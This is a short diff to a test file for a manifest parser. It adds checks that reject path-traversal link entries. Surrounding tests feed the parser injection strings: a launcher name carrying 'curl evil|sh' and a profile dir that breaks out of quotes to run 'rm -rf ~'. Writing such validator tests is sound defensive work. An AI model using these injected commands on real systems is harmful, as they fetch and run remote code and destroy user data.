@@ -40,6 +40,13 @@ describe('manifest', () => {
     it('rejects a launcher name with shell metacharacters', () => {
       expect(() => parseManifest(withProfile({ launcher: 'x; curl evil|sh' }))).toThrow(/unsafe launcher/)
     })
+    it.each(['../skills', 'nested/skills', '/tmp/skills', '.', '..'])(
+      'rejects unsafe link entry %j',
+      entry => expect(() => parseManifest(serializeManifest({
+        ...sample,
+        profiles: [{ ...sample.profiles[0], links: { [entry]: 'hub' } }],
+      } as any))).toThrow(/unsafe link entry/),
+    )
     it('rejects a profile dir that could break the quoted context', () => {
       expect(() => parseManifest(withProfile({ dir: '{home}/.claude"; rm -rf ~ #' }))).toThrow(/unsafe profile dir/)
     })
